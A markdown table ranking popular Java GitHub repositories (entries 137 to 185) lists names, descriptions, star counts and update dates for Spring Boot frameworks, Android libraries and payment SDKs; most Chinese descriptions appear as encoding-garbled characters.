|137|[stylefeng/Guns](https://github.com/stylefeng/Guns)|GunsÂü∫‰∫éSpringBoot 2ÔºåËá¥Âäõ‰∫éÂÅöÊõ¥ÁÆÄÊ¥ÅÁöÑÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÔºåÂÆåÁæéÊï¥Âêàspringmvc + shiro + mybatis-plus + beetl!GunsÈ°πÁõÆ‰ª£Á†ÅÁÆÄÊ¥ÅÔºåÊ≥®Èáä‰∏∞ÂØåÔºå‰∏äÊâãÂÆπÊòìÔºåÂêåÊó∂GunsÂåÖÂê´ËÆ∏Â§öÂü∫Á°ÄÊ®°Âùó(Áî®Êà∑ÁÆ°ÁêÜÔºåËßíËâ≤ÁÆ°ÁêÜÔºåÈÉ®Èó®ÁÆ°ÁêÜÔºåÂ≠óÂÖ∏ÁÆ°ÁêÜÁ≠â10‰∏™Ê®°Âùó)ÔºåÂèØ‰ª•Áõ¥Êé•‰Ωú‰∏∫‰∏Ä‰∏™ÂêéÂè∞ÁÆ°ÁêÜÁ≥ªÁªüÁöÑËÑöÊâãÊû∂!|3.1k|Java|07/02|
|138|[Exrick/xboot](https://github.com/Exrick/xboot)|Âü∫‰∫éSpring Boot 2.xÁöÑ‰∏ÄÁ´ôÂºèÂâçÂêéÁ´ØÂàÜÁ¶ªÂø´ÈÄüÂºÄÂèëÂπ≥Âè∞XBoot ÂæÆ‰ø°Â∞èÁ®ãÂ∫è+Uniapp ÂâçÁ´ØÔºöVue+iView Admin ÂêéÁ´ØÔºöSpring Boot 2.x/Spring Security/JWT/JPA+Mybatis-Plus/Redis/Elasticsearch/Activiti ÂàÜÂ∏ÉÂºèÈôêÊµÅ/ÂêåÊ≠•ÈîÅ/È™åËØÅÁ†Å/SnowFlakeÈõ™Ëä±ÁÆóÊ≥ïIDÁîüÊàê Âä®ÊÄÅÊùÉÈôêÁÆ°ÁêÜ Êï∞ÊçÆÊùÉÈôê Â∑•‰ΩúÊµÅ ‰ª£Á†ÅÁîüÊàê ÂÆöÊó∂‰ªªÂä° Á¨¨‰∏âÊñπÁ§æ‰∫§Ë¥¶Âè∑„ÄÅÁü≠‰ø°ÁôªÂΩï ÂçïÁÇπÁôªÂΩï OAuth2ÂºÄÊîæÂπ≥Âè∞|3.0k|Java|10/30|
|139|[liuyubobobo/Play-with-Algorithms](https://github.com/liuyubobobo/Play-with-Algorithms)|Codes of my MOOC Course <Play with Algorithms>, Both in C++ and Java language. Updated contents and practices are also included. ÊàëÂú®ÊÖïËØæÁΩë‰∏äÁöÑËØæÁ®ã„ÄäÁÆóÊ≥ï‰∏éÊï∞ÊçÆÁªìÊûÑ„ÄãÁ§∫‰æã‰ª£Á†ÅÔºåÂåÖÊã¨C++ÂíåJavaÁâàÊú¨„ÄÇËØæÁ®ãÁöÑÊõ¥Â§öÊõ¥Êñ∞ÂÜÖÂÆπÂèäËæÖÂä©ÁªÉ‰π†‰πüÂ∞ÜÈÄêÊ≠•Ê∑ªÂä†ËøõËøô‰∏™‰ª£Á†Å‰ªì„ÄÇ|3.0k|Java|09/06|
|140|[Doikki/DKVideoPlayer](https://github.com/Doikki/DKVideoPlayer)|Android Video Player. ÂÆâÂçìËßÜÈ¢ëÊí≠ÊîæÂô®ÔºåÂ∞ÅË£ÖMediaPlayer„ÄÅExoPlayer„ÄÅIjkPlayer„ÄÇÊ®°‰ªøÊäñÈü≥Âπ∂ÂÆûÁé∞È¢ÑÂä†ËΩΩÔºåÂàóË°®Êí≠ÊîæÔºåÊÇ¨ÊµÆÊí≠ÊîæÔºåÂπøÂëäÊí≠ÊîæÔºåÂºπÂπï|3.0k|Java|06/01|
|141|[promeG/TinyPinyin](https://github.com/promeG/TinyPinyin)|ÈÄÇÁî®‰∫éJavaÂíåAndroidÁöÑÂø´ÈÄü„ÄÅ‰ΩéÂÜÖÂ≠òÂç†Áî®ÁöÑÊ±âÂ≠óËΩ¨ÊãºÈü≥Â∫ì„ÄÇ|3.0k|Java|10/18|
|142|[tuguangquan/mybatis](https://github.com/tuguangquan/mybatis)|mybatisÊ∫êÁ†Å‰∏≠ÊñáÊ≥®Èáä|2.9k|Java|10/13|
|143|[zhou-you/RxEasyHttp](https://github.com/zhou-you/RxEasyHttp)|Êú¨Â∫ìÊòØ‰∏ÄÊ¨æÂü∫‰∫éRxJava2+Retrofit2ÂÆûÁé∞ÁÆÄÂçïÊòìÁî®ÁöÑÁΩëÁªúËØ∑Ê±ÇÊ°ÜÊû∂ÔºåÁªìÂêàandroidÂπ≥Âè∞ÁâπÊÄßÁöÑÁΩëÁªúÂ∞ÅË£ÖÂ∫ì,ÈááÁî®apiÈìæÂºèË∞ÉÁî®‰∏ÄÁÇπÂà∞Â∫ï,ÈõÜÊàêcookieÁÆ°ÁêÜ,Â§öÁßçÁºìÂ≠òÊ®°Âºè,ÊûÅÁÆÄhttpsÈÖçÁΩÆ,‰∏ä‰º†‰∏ãËΩΩËøõÂ∫¶ÊòæÁ§∫,ËØ∑Ê±ÇÈîôËØØËá™Âä®ÈáçËØï,ËØ∑Ê±ÇÊê∫Â∏¶token„ÄÅÊó∂Èó¥Êà≥„ÄÅÁ≠æÂêçsignÂä®ÊÄÅÈÖçÁΩÆ,Ëá™Âä®ÁôªÂΩïÊàêÂäüÂêéËØ∑Ê±ÇÈáçÂèëÂäüËÉΩ,3ÁßçÂ±ÇÊ¨°ÁöÑÂèÇÊï∞ËÆæÁΩÆÈªòËÆ§ÂÖ®Â±ÄÂ±ÄÈÉ®,ÈªòËÆ§Ê†áÂáÜApiResultÂêåÊó∂ÂèØ‰ª•ÊîØÊåÅËá™ÂÆö‰πâÁöÑÊï∞ÊçÆÁªìÊûÑÔºåÂ∑≤ÁªèËÉΩÊª°Ë∂≥Áé∞Âú®ÁöÑÂ§ßÈÉ®ÂàÜÁΩëÁªúËØ∑Ê±Ç„ÄÇ|2.9k|Java|09/22|
|144|[crazyandcoder/citypicker](https://github.com/crazyandcoder/citypicker)|citypickerÂüéÂ∏ÇÈÄâÊã©Âô®ÔºåËØ¶ÁªÜÁöÑÁúÅÂ∏ÇÂå∫Âú∞ÂùÄ‰ø°ÊÅØÔºåÊîØÊåÅ‰ªøiOSÊªöËΩÆÂÆûÁé∞Ôºå‰ªø‰∫¨‰∏úÊ†∑ÂºèÔºå‰∏ÄÁ∫ßÊàñËÄÖ‰∏âÁ∫ßÂàóË°®Â±ïÁ§∫ÊñπÂºè„ÄÇ|2.9k|Java|04/29|
|145|[Snailclimb/springboot-guide](https://github.com/Snailclimb/springboot-guide)|Not only Spring Boot but also important knowledge of SpringÔºà‰∏çÂè™ÊòØSpringBootËøòÊúâSpringÈáçË¶ÅÁü•ËØÜÁÇπÔºâ|2.8k|Java|10/13|
|146|[huburt-Hu/NewbieGuide](https://github.com/huburt-Hu/NewbieGuide)|Android Âø´ÈÄüÂÆûÁé∞Êñ∞ÊâãÂºïÂØºÂ±ÇÁöÑÂ∫ìÔºåÈÄöËøáÁÆÄÊ¥ÅÈìæÂºèË∞ÉÁî®Ôºå‰∏ÄË°å‰ª£Á†ÅÂÆûÁé∞ÂºïÂØºÂ±ÇÁöÑÊòæÁ§∫|2.8k|Java|07/01|
|147|[lenve/JavaEETest](https://github.com/lenve/JavaEETest)|Spring„ÄÅSpringMVC„ÄÅMyBatis„ÄÅSpring BootÊ°à‰æã|2.7k|Java|10/13|
|148|[FinalTeam/RxGalleryFinal](https://github.com/FinalTeam/RxGalleryFinal)|ÂõæÁâáÈÄâÊã©Â∫ìÔºåÂçïÈÄâ/Â§öÈÄâ„ÄÅÊãçÁÖß„ÄÅË£ÅÂâ™„ÄÅÂéãÁº©ÔºåËá™ÂÆö‰πâ„ÄÇÂåÖÊã¨ËßÜÈ¢ëÈÄâÊã©ÂíåÂΩïÂà∂„ÄÇ|2.7k|Java|09/25|
|149|[mxdldev/android-mvp-mvvm-flytour](https://github.com/mxdldev/android-mvp-mvvm-flytour)|üî•üî•üî• FlyTourÊòØAndroid MVVM+MVP+Dagger2+Retrofit+RxJava+ÁªÑ‰ª∂Âåñ+Êèí‰ª∂ÁªÑÊàêÁöÑÂèåÁºñÁ†ÅÊû∂ÊûÑ+ÂèåÂ∑•Á®ãÊû∂ÊûÑ+ÂèåËØ≠Ë®ÄAndroidÂ∫îÁî®ÂºÄÂèëÊ°ÜÊû∂ÔºåÈÄöËøá‰∏çÊñ≠ÁöÑÂçáÁ∫ßËø≠‰ª£ËØ•Ê°ÜÊû∂Â∑≤ÁªèÊúâ‰∫ÜÂçÅ‰∏™‰∏çÂêåÁöÑÁâàÊú¨Ôºå5.0‰πãÂâçÂ∑•Á®ãÊû∂ÊûÑÈááÁî®gradleÈÖçÁΩÆÂÆûÁé∞ÁªÑ‰ª∂ÂåñÔºå5.0‰πãÂêéÁöÑÂ∑•Á®ãÊû∂ÊûÑÈááÁî®VirtualAPKÂÆûÁé∞‰∫ÜÊèí‰ª∂ÂåñÔºå5.0‰πãÂâçÈááÁî®JavaÁºñÁ†ÅÂÆûÁé∞Ôºå5.0‰πãÂêéÈááÁî®KotlinÁºñÁ†ÅÂÆûÁé∞ÔºåÁºñÁ†ÅÊû∂ÊûÑÁî±MVVMÂíåMVPÁªÑÊàêÔºåÂ∑•Á®ãÊû∂ÊûÑÂíåÁºñÁ†ÅÊû∂ÊûÑÂèäÁºñÁ†ÅËØ≠Ë®ÄÂºÄÂèëËÄÖÂèØÊ†πÊçÆËá™Â∑±ÂÖ∑‰ΩìÁöÑÈ°πÁõÆÂÆûÈôÖÈúÄÊ±ÇÂéªÂÜ≥ÂÆöÈÄâÊã©‰ΩøÁî®ÔºåËØ•Ê°ÜÊû∂ÊòØAndroidÁªÑ‰ª∂Âåñ„ÄÅAndroidÊèí‰ª∂Âåñ„ÄÅAndroid MVPÊû∂ÊûÑ„ÄÅAn ...|2.7k|Java|06/29|
|150|[macrozheng/springcloud-learning](https://github.com/macrozheng/springcloud-learning)|‰∏ÄÂ•óÊ∂µÁõñÂ§ßÈÉ®ÂàÜÊ†∏ÂøÉÁªÑ‰ª∂‰ΩøÁî®ÁöÑSpring CloudÊïôÁ®ãÔºåÂåÖÊã¨Spring Cloud AlibabaÂèäÂàÜÂ∏ÉÂºè‰∫ãÂä°SeataÔºåÂü∫‰∫éSpring Cloud GreenwichÂèäSpringBoot 2.1.7„ÄÇ21ÁØáÊñáÁ´†ÔºåÁØáÁØáÁ≤æÂçéÔºå32‰∏™DemoÔºåÊ∂µÁõñÂ§ßÈÉ®ÂàÜÂ∫îÁî®Âú∫ÊôØ„ÄÇ|2.7k|Java|09/15|
|151|[jiajunhui/PlayerBase](https://github.com/jiajunhui/PlayerBase)|The basic library of Android player will process complex business components. The access is simple„ÄÇAndroidÊí≠ÊîæÂô®Âü∫Á°ÄÂ∫ìÔºå‰∏ìÊ≥®‰∫éÊí≠ÊîæËßÜÂõæÁªÑ‰ª∂ÁöÑÈ´òÂ§çÁî®ÊÄßÂíåÁªÑ‰ª∂Èó¥ÁöÑ‰ΩéËÄ¶ÂêàÔºåËΩªÊùæÂ§ÑÁêÜÂ§çÊùÇ‰∏öÂä°„ÄÇ|2.7k|Java|10/11|
|152|[MagicMashRoom/SuperCalendar](https://github.com/MagicMashRoom/SuperCalendar)|@Deprecated android Ëá™ÂÆö‰πâÊó•ÂéÜÊéß‰ª∂  ÊîØÊåÅÂ∑¶Âè≥Êó†ÈôêÊªëÂä® Âë®ÊúàÂàáÊç¢ Ê†áËÆ∞Êó•ÊúüÊòæÁ§∫ Ëá™ÂÆö‰πâÊòæÁ§∫ÊïàÊûúË∑≥ËΩ¨Âà∞ÊåáÂÆöÊó•Êúü|2.7k|Java|05/31|
|153|[saysky/ForestBlog](https://github.com/saysky/ForestBlog)|‰∏Ä‰∏™ÁÆÄÂçïÊºÇ‰∫ÆÁöÑSSM(Spring+SpringMVC+Mybatis)ÂçöÂÆ¢Á≥ªÁªü|2.7k|Java|10/24|
|154|[JavaNoober/BackgroundLibrary](https://github.com/JavaNoober/BackgroundLibrary)|A framework for directly generating shape through Tags, no need to write shape.xml againÔºàÈÄöËøáÊ†áÁ≠æÁõ¥Êé•ÁîüÊàêshapeÔºåÊó†ÈúÄÂÜçÂÜôshape.xmlÔºâ|2.7k|Java|10/20|
|155|[Javen205/IJPay](https://github.com/Javen205/IJPay)|IJPay ËÆ©ÊîØ‰ªòËß¶ÊâãÂèØÂèäÔºåÂ∞ÅË£Ö‰∫ÜÂæÆ‰ø°ÊîØ‰ªò„ÄÅQQÊîØ‰ªò„ÄÅÊîØ‰ªòÂÆùÊîØ‰ªò„ÄÅ‰∫¨‰∏úÊîØ‰ªò„ÄÅÈì∂ËÅîÊîØ‰ªò„ÄÅPayPal ÊîØ‰ªòÁ≠âÂ∏∏Áî®ÁöÑÊîØ‰ªòÊñπÂºè‰ª•ÂèäÂêÑÁßçÂ∏∏Áî®ÁöÑÊé•Âè£„ÄÇ‰∏ç‰æùËµñ‰ªª‰ΩïÁ¨¨‰∏âÊñπ mvc Ê°ÜÊû∂Ôºå‰ªÖ‰ªÖ‰Ωú‰∏∫Â∑•ÂÖ∑‰ΩøÁî®ÁÆÄÂçïÂø´ÈÄüÂÆåÊàêÊîØ‰ªòÊ®°ÂùóÁöÑÂºÄÂèëÔºåÂèØËΩªÊùæÂµåÂÖ•Âà∞‰ªª‰ΩïÁ≥ªÁªüÈáå„ÄÇÂè≥‰∏äËßíÁÇπ‰∏ãÂ∞èÊòüÊòü‚ú® |2.6k|Java|09/24|
|156|[xuexiangjys/XUI](https://github.com/xuexiangjys/XUI)|üíç‰∏Ä‰∏™ÁÆÄÊ¥ÅËÄå‰ºòÈõÖÁöÑAndroidÂéüÁîüUIÊ°ÜÊû∂ÔºåËß£Êîæ‰Ω†ÁöÑÂèåÊâãÔºÅ|2.6k|Java|10/14|
|157|[AbrahamCaiJin/CommonUtilLibrary](https://github.com/AbrahamCaiJin/CommonUtilLibrary)|Âø´ÈÄüÂºÄÂèëÂ∑•ÂÖ∑Á±ªÊî∂ÈõÜÔºåÂè≤‰∏äÊúÄÂÖ®ÁöÑÂºÄÂèëÂ∑•ÂÖ∑Á±ªÔºåÊ¨¢ËøéFollow„ÄÅFork„ÄÅStar|2.6k|Java|05/11|
|158|[dingjikerbo/Android-BluetoothKit](https://github.com/dingjikerbo/Android-BluetoothKit)|Android BLEËìùÁâôÈÄö‰ø°Â∫ì|2.6k|Java|02/12|
|159|[fengjundev/Android-Skin-Loader](https://github.com/fengjundev/Android-Skin-Loader)|‰∏Ä‰∏™ÈÄöËøáÂä®ÊÄÅÂä†ËΩΩÊú¨Âú∞ÁöÆËÇ§ÂåÖËøõË°åÊç¢ËÇ§ÁöÑÁöÆËÇ§Ê°ÜÊû∂|2.5k|Java|02/11|
|160|[android-notes/Cockroach](https://github.com/android-notes/Cockroach)|Èôç‰ΩéAndroidÈùûÂøÖË¶Åcrash|2.5k|Java|08/28|
|161|[prontera/spring-cloud-rest-tcc](https://github.com/prontera/spring-cloud-rest-tcc)|‰ª•Spring Cloud Netflix‰Ωú‰∏∫ÊúçÂä°Ê≤ªÁêÜÂü∫Á°Ä, Â±ïÁ§∫Âü∫‰∫étccÊÄùÊÉ≥ÊâÄÂÆûÁé∞ÁöÑÂàÜÂ∏ÉÂºè‰∫ãÂä°Ëß£ÂÜ≥ÊñπÊ°à|2.5k|Java|02/09|
|162|[KingJA/LoadSir](https://github.com/KingJA/LoadSir)|A lightweight, good expandability Android library used for displaying different pages like loading, error, empty, timeout or even your custom page when you load a page.(‰ºòÈõÖÂú∞Â§ÑÁêÜÂä†ËΩΩ‰∏≠ÔºåÈáçËØïÔºåÊó†Êï∞ÊçÆÁ≠â)|2.5k|Java|09/25|
|163|[yangchong211/LifeHelper](https://github.com/yangchong211/LifeHelper)|„ÄêÂÅúÊ≠¢Áª¥Êä§„ÄëÁªÑ‰ª∂ÂåñÁªºÂêàÊ°à‰æãÔºåÂåÖÂê´ÂæÆ‰ø°Êñ∞ÈóªÔºåÂ§¥Êù°ËßÜÈ¢ëÔºåÁæéÂ•≥ÂõæÁâáÔºåÁôæÂ∫¶Èü≥‰πêÔºåÂπ≤Ê¥ªÈõÜ‰∏≠Ëê•ÔºåÁé©AndroidÔºåË±ÜÁì£ËØª‰π¶ÁîµÂΩ±ÔºåÁü•‰πéÊó•Êä•Á≠âÁ≠âÊ®°Âùó„ÄÇÊû∂ÊûÑÊ®°ÂºèÔºöÁªÑ‰ª∂Âåñ+MVP+Rx+Retrofit+Desgin+Dagger2+ÈòøÈáåVLayout+ËÖæËÆØX5+ËÖæËÆØbugly„ÄÇËûçÂêàÂºÄÂèë‰∏≠ÈúÄË¶ÅÁöÑÂêÑÁßçÂ∞èÊ°à‰æãÔºÅ|2.5k|Java|10/28|
|164|[qunarcorp/bistoury](https://github.com/qunarcorp/bistoury)|BistouryÊòØÂéªÂì™ÂÑøÁΩëÁöÑjavaÂ∫îÁî®Áîü‰∫ßÈóÆÈ¢òËØäÊñ≠Â∑•ÂÖ∑ÔºåÊèê‰æõ‰∫Ü‰∏ÄÁ´ôÂºèÁöÑÈóÆÈ¢òËØäÊñ≠ÊñπÊ°à|2.5k|Java|10/23|
|165|[Hitomis/transferee](https://github.com/Hitomis/transferee)|‰∏Ä‰∏™Â∏ÆÂä©ÊÇ®ÂÆåÊàê‰ªéÁº©Áï•ËßÜÂõæÂà∞ÂéüËßÜÂõæÊó†ÁºùËøáÊ∏°ËΩ¨ÂèòÁöÑÁ•ûÂ•áÊ°ÜÊû∂|2.4k|Java|06/27|
|166|[doocs/jvm](https://github.com/doocs/jvm)|ü§ó JVM Â∫ïÂ±ÇÂéüÁêÜÁü•ËØÜÊÄªÁªì|2.4k|Java|10/24|
|167|[KunMinX/Linkage-RecyclerView](https://github.com/KunMinX/Linkage-RecyclerView)|Âç≥‰Ωø‰∏çÁî®È•ø‰∫Ü‰πàËÆ¢È§êÔºå‰πüËØ∑Âä°ÂøÖÊî∂ËóèÂ•ΩËØ•Â∫ìÔºÅüî•  ‰∏ÄË°å‰ª£Á†ÅÂç≥ÂèØÊé•ÂÖ•Ôºå‰∫åÁ∫ßËÅîÂä®ËÆ¢È§êÂàóË°® - Even if you don't order food by PrubHub, be sure to collect this library, please! üî• This secondary linkage list widget can be accessed by only one line of code. Supporting by RecyclerView & AndroidX.|2.4k|Java|09/20|
|168|[metersphere/metersphere](https://github.com/metersphere/metersphere)|An open source continuous testing platform. MeterSphere ÊòØ‰∏ÄÁ´ôÂºèÁöÑÂºÄÊ∫ê‰ºÅ‰∏öÁ∫ßÊåÅÁª≠ÊµãËØïÂπ≥Âè∞ÔºåÊ∂µÁõñÊµãËØïË∑üË∏™„ÄÅÊé•Âè£ÊµãËØï„ÄÅÊÄßËÉΩÊµãËØï„ÄÅÂõ¢ÈòüÂçè‰ΩúÁ≠âÂäüËÉΩÔºåÂÖ®Èù¢ÂÖºÂÆπ JMeter„ÄÅPostman Á≠âÂºÄÊ∫ê„ÄÅ‰∏ªÊµÅÊ†áÂáÜ„ÄÇÈ°πÁõÆÈááÁî® SpringBoot 2.x + MyBatis + Vue.js + Element + Docker + Kafka + MySQLÁ≠âÂºÄÂèë„ÄÇ|2.4k|Java|10/29|
|169|[BaronZ88/MinimalistWeather](https://github.com/BaronZ88/MinimalistWeather)|Android Âπ≥Âè∞ÂºÄÊ∫êÂ§©Ê∞î AppÔºåÈááÁî® MVP„ÄÅRxJava„ÄÅRetrofit2„ÄÅOKHttp3„ÄÅDagger2„ÄÅRetroLambda Á≠âÂºÄÊ∫êÂ∫ìÊù•ÂÆûÁé∞„ÄÇ|2.4k|Java|10/09|
|170|[AlexLiuSheng/CheckVersionLib](https://github.com/AlexLiuSheng/CheckVersionLib)|ÁâàÊú¨Ê£ÄÊµãÂçáÁ∫ßÔºàÊõ¥Êñ∞ÔºâÂ∫ì„ÄÇan auto check version libraryÔºàapp updateÔºâ on Android|2.4k|Java|09/28|
|171|[Pay-Group/best-pay-sdk](https://github.com/Pay-Group/best-pay-sdk)|ÂèØËÉΩÊòØÊúÄÂ•ΩÁöÑÊîØ‰ªòSDK|2.3k|Java|10/19|
|172|[LaiFeng-Android/SopCastComponent](https://github.com/LaiFeng-Android/SopCastComponent)|Êù•ÁñØÁõ¥Êí≠ÂÆâÂçìÊéß‰ª∂ÔºåÊîØÊåÅflvÔºåÊîØÊåÅrtmpÔºåÊîØÊåÅÊ∑ªÂä†ËßÜÈ¢ëÁâπÊïàÁ≠âÁ≠â|2.3k|Java|06/04|
|173|[JeremyLiao/LiveEventBus](https://github.com/JeremyLiao/LiveEventBus)|:mailbox_with_mail:EventBus for AndroidÔºåÊ∂àÊÅØÊÄªÁ∫øÔºåÂü∫‰∫éLiveDataÔºåÂÖ∑ÊúâÁîüÂëΩÂë®ÊúüÊÑüÁü•ËÉΩÂäõÔºåÊîØÊåÅStickyÔºåÊîØÊåÅAndroidXÔºåÊîØÊåÅË∑®ËøõÁ®ãÔºåÊîØÊåÅË∑®APP|2.3k|Java|08/26|
|174|[JsonChao/Awesome-WanAndroid](https://github.com/JsonChao/Awesome-WanAndroid)|:zap:Ëá¥Âäõ‰∫éÊâìÈÄ†‰∏ÄÊ¨æÊûÅËá¥‰ΩìÈ™åÁöÑ http://www.wanandroid.com/ ÂÆ¢Êà∑Á´ØÔºåÁü•ËØÜÂíåÁæéÊòØÂèØ‰ª•Âπ∂Â≠òÁöÑÂì¶QAQn(*‚âß‚ñΩ‚â¶*)n|2.3k|Java|10/29|
|175|[zlt2000/microservices-platform](https://github.com/zlt2000/microservices-platform)|Âü∫‰∫éSpringBoot2.x„ÄÅSpringCloudÂíåSpringCloudAlibabaÂπ∂ÈááÁî®ÂâçÂêéÁ´ØÂàÜÁ¶ªÁöÑ‰ºÅ‰∏öÁ∫ßÂæÆÊúçÂä°Â§öÁßüÊà∑Á≥ªÁªüÊû∂ÊûÑ„ÄÇÂπ∂ÂºïÂÖ•ÁªÑ‰ª∂ÂåñÁöÑÊÄùÊÉ≥ÂÆûÁé∞È´òÂÜÖËÅö‰ΩéËÄ¶ÂêàÔºåÈ°πÁõÆ‰ª£Á†ÅÁÆÄÊ¥ÅÊ≥®Èáä‰∏∞ÂØå‰∏äÊâãÂÆπÊòìÔºåÈÄÇÂêàÂ≠¶‰π†Âíå‰ºÅ‰∏ö‰∏≠‰ΩøÁî®„ÄÇÁúüÊ≠£ÂÆûÁé∞‰∫ÜÂü∫‰∫éRBAC„ÄÅjwtÂíåoauth2ÁöÑÊó†Áä∂ÊÄÅÁªü‰∏ÄÊùÉÈôêËÆ§ËØÅÁöÑËß£ÂÜ≥ÊñπÊ°àÔºåÈù¢Âêë‰∫íËÅîÁΩëËÆæËÆ°ÂêåÊó∂ÈÄÇÂêàBÁ´ØÂíåCÁ´ØÁî®Êà∑ÔºåÊîØÊåÅCI/CDÂ§öÁéØÂ¢ÉÈÉ®ÁΩ≤ÔºåÂπ∂Êèê‰æõÂ∫îÁî®ÁÆ°ÁêÜÊñπ‰æøÁ¨¨‰∏âÊñπÁ≥ªÁªüÊé•ÂÖ•ÔºõÂêåÊó∂ËøòÈõÜÂêàÂêÑÁßçÂæÆÊúçÂä°Ê≤ªÁêÜÂäüËÉΩÂíåÁõëÊéßÂäüËÉΩ„ÄÇÊ®°ÂùóÂåÖÊã¨:‰ºÅ‰∏öÁ∫ßÁöÑËÆ§ËØÅÁ≥ªÁªü„ÄÅÂºÄÂèëÂπ≥Âè∞„ÄÅÂ∫îÁî®ÁõëÊéß„ÄÅÊÖ¢sqlÁõëÊéß„ÄÅÁªü‰∏ÄÊó•Âøó„ÄÅÂçïÁÇπÁôªÂΩï„ÄÅRedisÂàÜÂ∏ÉÂºèÈ´òÈÄüÁºìÂ≠ò„ÄÅÈÖçÁΩÆ‰∏≠ÂøÉ„ÄÅÂàÜÂ∏ÉÂºè‰ªªÂä°Ë∞ÉÂ∫¶„ÄÅÊé•Âè£ÊñáÊ°£„ÄÅ‰ª£Á†ÅÁîüÊàêÁ≠âÁ≠â„ÄÇ|2.2k|Java|10/13|
|176|[liyiorg/weixin-popular](https://github.com/liyiorg/weixin-popular)|ÂæÆ‰ø°SDK  JAVA  (ÂÖ¨‰ºóÂπ≥Âè∞„ÄÅÂºÄÊîæÂπ≥Âè∞„ÄÅ ÂïÜÊà∑Âπ≥Âè∞„ÄÅ ÊúçÂä°ÂïÜÂπ≥Âè∞)|2.2k|Java|08/25|
|177|[svga/SVGAPlayer-Android](https://github.com/svga/SVGAPlayer-Android)|Similar to Lottie. Render After Effects / Animate CC (Flash) animations natively on Android and iOS, Web.  ‰ΩøÁî® SVGAPlayer Âú® Android„ÄÅiOS„ÄÅWeb‰∏≠Êí≠Êîæ After Effects / Animate CC (Flash) Âä®Áîª„ÄÇ|2.2k|Java|10/09|
|178|[qunarcorp/qmq](https://github.com/qunarcorp/qmq)| QMQÊòØÂéªÂì™ÂÑøÁΩëÂÜÖÈÉ®ÂπøÊ≥õ‰ΩøÁî®ÁöÑÊ∂àÊÅØ‰∏≠Èó¥‰ª∂ÔºåËá™2012Âπ¥ËØûÁîü‰ª•Êù•Âú®ÂéªÂì™ÂÑøÁΩëÊâÄÊúâ‰∏öÂä°Âú∫ÊôØ‰∏≠ÂπøÊ≥õÁöÑÂ∫îÁî®ÔºåÂåÖÊã¨Ë∑ü‰∫§ÊòìÊÅØÊÅØÁõ∏ÂÖ≥ÁöÑËÆ¢ÂçïÂú∫ÊôØÔºõ ‰πüÂåÖÊã¨Êä•‰ª∑ÊêúÁ¥¢Á≠âÈ´òÂêûÂêêÈáèÂú∫ÊôØ„ÄÇ|2.2k|Java|10/27|
|179|[QNJR-GROUP/EasyTransaction](https://github.com/QNJR-GROUP/EasyTransaction)|A distribute transaction solutionÔºàÂàÜÂ∏ÉÂºè‰∫ãÂä°Ôºâ unified the usage of TCC , SAGA ,FMT (seata/fescar AutoCompensation)Ôºå reliable message, compensate and so on;|2.2k|Java|09/22|
|180|[JPressProjects/jpress](https://github.com/JPressProjects/jpress)|JPressÔºå‰∏Ä‰∏™‰ΩøÁî® Java ÂºÄÂèëÁöÑÂª∫Á´ôÁ•ûÂô®ÔºåÁõÆÂâçÂ∑≤ÁªèÊúâ 10w+ ÁΩëÁ´ô‰ΩøÁî® JPress ËøõË°åÈ©±Âä®ÔºåÂÖ∂‰∏≠ÂåÖÊã¨Â§ö‰∏™ÊîøÂ∫úÊú∫ÊûÑÔºå200+‰∏äÂ∏ÇÂÖ¨Âè∏Ôºå‰∏≠ÁßëÈô¢„ÄÅÁ∫¢+Â≠ó‰ºöÁ≠â„ÄÇ|2.2k|Java|10/19|
|181|[mqzhangw/JIMU](https://github.com/mqzhangw/JIMU)|‰∏ÄÁßçÁÆÄÂçïÊúâÊïàÁöÑandroidÁªÑ‰ª∂ÂåñÊñπÊ°àÔºåÊîØÊåÅÁªÑ‰ª∂ÁöÑ‰ª£Á†ÅËµÑÊ∫êÈöîÁ¶ª„ÄÅÂçïÁã¨Ë∞ÉËØï„ÄÅÈõÜÊàêË∞ÉËØï„ÄÅÁªÑ‰ª∂‰∫§‰∫í„ÄÅUIË∑≥ËΩ¨„ÄÅÁîüÂëΩÂë®ÊúüÁ≠âÂÆåÊï¥ÂäüËÉΩ„ÄÇ|2.1k|Java|10/17|
|182|[BeesX/BeesAndroid](https://github.com/BeesX/BeesAndroid)|AndroidÁ≥ªÁªüÊ∫êÁ†ÅÂàÜÊûêÈáçÊûÑ‰∏≠|2.1k|Java|07/10|
|183|[xubinux/xbin-store](https://github.com/xubinux/xbin-store)|Ê®°‰ªøÂõΩÂÜÖÁü•ÂêçB2CÁΩëÁ´ô,ÂÆûÁé∞ÁöÑ‰∏Ä‰∏™ÂàÜÂ∏ÉÂºèB2CÂïÜÂüé ‰ΩøÁî®Spring Boot Ëá™Âä®ÈÖçÁΩÆ Dubbox / MVC / MyBatis / Druid / Solr / Redis Á≠â„ÄÇ‰ΩøÁî®Spring CloudÁâàÊú¨ËØ∑Êü•Áúã|2.1k|Java|10/13|
|184|[l123456789jy/Lazy](https://github.com/l123456789jy/Lazy)|The android tools           Ëá™Â∑±Êï¥ÁêÜÁöÑÂ∏∏Áî®ÁöÑÂ∑•ÂÖ∑Á±ª   |2.1k|Java|08/28|
|185|[xtuhcy/gecco](https://github.com/xtuhcy/gecco)|Easy to use lightweight web crawlerÔºàÊòìÁî®ÁöÑËΩªÈáèÂåñÁΩëÁªúÁà¨Ëô´Ôºâ|2.1k|Java|07/23|
